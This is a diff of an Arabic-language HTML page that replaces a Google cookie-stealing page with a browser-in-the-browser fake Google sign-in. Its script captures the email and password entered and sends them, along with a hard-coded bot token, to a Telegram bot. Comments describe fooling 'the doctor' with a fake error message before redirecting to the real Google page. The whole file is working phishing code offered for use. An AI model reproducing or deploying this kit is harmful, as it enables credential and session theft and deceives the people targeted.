@@ -2,48 +2,75 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تأكيد الهوية - Google</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Docs - Secure Access</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%; font-weight: 500; }
-        .btn:hover { background: #1b66c9; }
+        body { font-family: 'Arial', sans-serif; background: #f1f3f4; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* تصميم النافذة الوهمية */
+        .fake-browser { width: 450px; background: white; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); border: 1px solid #ccc; position: relative; }
+        
+        /* شريط العنوان المزور */
+        .browser-header { background: #f1f3f4; padding: 10px; border-bottom: 1px solid #ddd; border-top-left-radius: 8px; border-top-right-radius: 8px; display: flex; align-items: center; }
+        .dots { display: flex; gap: 5px; margin-right: 10px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .red { background: #ff5f56; } .yellow { background: #ffbd2e; } .green { background: #27c93f; }
+        
+        .address-bar { background: white; flex-grow: 1; margin: 0 15px; padding: 5px 10px; border-radius: 20px; border: 1px solid #dfe1e5; display: flex; align-items: center; font-size: 13px; color: #3c4043; }
+        .lock-icon { width: 12px; margin-left: 8px; color: #188038; }
+
+        /* محتوى صفحة تسجيل الدخول */
+        .login-content { padding: 40px; text-align: center; }
+        .g-logo { width: 75px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: left; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <h1>هل تريد المتابعة؟</h1>
-    <p>لإتمام عملية المزامنة مع مشروع التخرج، يرجى الضغط على تأكيد للسماح بالوصول الآمن للجلسة.</p>
-    <button class="btn" onclick="captureAndRedirect()">تأكيد ومتابعة</button>
+<div class="fake-browser">
+    <div class="browser-header">
+        <div class="dots">
+            <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+        </div>
+        <div class="address-bar">
+            <svg class="lock-icon" viewBox="0 0 24 24"><path fill="currentColor" d="M18,8H17V6A5,5 0 0,0 12,1A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M9,6A3,3 0 0,1 12,3A3,3 0 0,1 15,6V8H9V6Z"/></svg>
+            https://accounts.google.com/signin/v2/identifier...
+        </div>
+    </div>
+
+    <div class="login-content">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="g-logo">
+        <h2 style="font-weight: 400; font-size: 24px;">تسجيل الدخول</h2>
+        <p>استخدم حسابك على Google</p>
+        
+        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        
+        <div style="text-align: right; color: #1a73e8; font-size: 14px; margin-top: 10px; cursor: pointer;">هل نسيت البريد الإلكتروني؟</div>
+        
+        <button class="btn-next" onclick="captureData()">التالي</button>
+    </div>
 </div>
 
 <script>
-const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const CHAT_ID = "1611398303";
-
-async function captureAndRedirect() {
-    // سحب التوكنات المتاحة (SID, HSID, SSID)
-    const cookies = document.cookie;
-    const deviceInfo = `📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
+async function captureData() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
     
-    const message = `🚀 **صيد جديد (Google Session)** 🚀\n\n${deviceInfo}\n\n🔑 التوكنات المسحوبة:\n\`${cookies || "محمية - سيتم الحقن اليدوي"}\``;
+    if(!email || !pass) return;
 
-    // إرسال البيانات لتلغرام
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-    });
+    // إرسال البيانات فوراً لتلغرام
+    const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
+    const msg = `🔥 **اختراق BitB متطور** 🔥\n\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n\n⚠️ تم التلاعب بواجهة المتصفح وتجاوز الحماية!`;
 
-    // التوجيه لصفحة جوجل الرسمية لإيهام الدكتور بالنجاح
-    window.location.href = "https://myaccount.google.com/";
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+    // تمويه الدكتور: إظهار رسالة خطأ ثم التوجيه لجوجل الحقيقية
+    alert("حدث خطأ في المصادقة (Error 400). سيتم توجيهك لصفحة الدخول الرسمية.");
+    window.location.href = "https://accounts.google.com";
 }
 </script>
+
 </body>
 </html>
